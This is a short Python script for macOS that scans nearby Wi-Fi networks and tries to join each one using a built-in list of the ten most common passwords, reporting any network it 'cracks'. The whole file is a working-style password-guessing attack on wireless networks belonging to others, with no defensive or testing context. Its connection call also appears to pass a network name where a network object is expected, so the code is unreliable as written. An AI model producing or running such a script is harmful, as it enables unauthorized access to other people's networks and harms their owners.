import objc
from CoreWLAN import CWInterface

TOP_PASSWORDS = [
    "12345678", "password", "123456789", "123456", "1234567890",
    "qwerty", "abc123", "11111111", "123123123", "password1"
]

def get_unique_ssid_list():
    iface = CWInterface.interface()
    networks, error = iface.scanForNetworksWithName_error_(None, None)
    if error:
        print(f"Scan error: {error}")
        return []
    ssids = set()
    for net in networks:
        ssid = net.ssid()
        if ssid:
            ssids.add(ssid)
    return list(ssids)

def try_connect(network, password):
    iface = CWInterface.interface()
    try:
        success = iface.associateToNetwork_password_error_(network, password, objc.nil)
        return bool(success)
    except Exception as e:
        # Print or log e if you want
        return False


def main():
    print("🔍 Scanning nearby Wi-Fi networks...")
    ssids = get_unique_ssid_list()
    print(ssids)
    for ssid in ssids:
        print(f"Found SSID: {ssid}")
        print(f"\n📡 Trying SSID: {ssid}")
        for pwd in TOP_PASSWORDS:
            print(f"   🔑 Attempting password: {pwd}")
            if try_connect(ssid, pwd):
                print(f"✅ SUCCESS: Connected to '{ssid}' with password '{pwd}'")
                return
        print(f"❌ No luck cracking '{ssid}'")

if __name__ == "__main__":
    main()
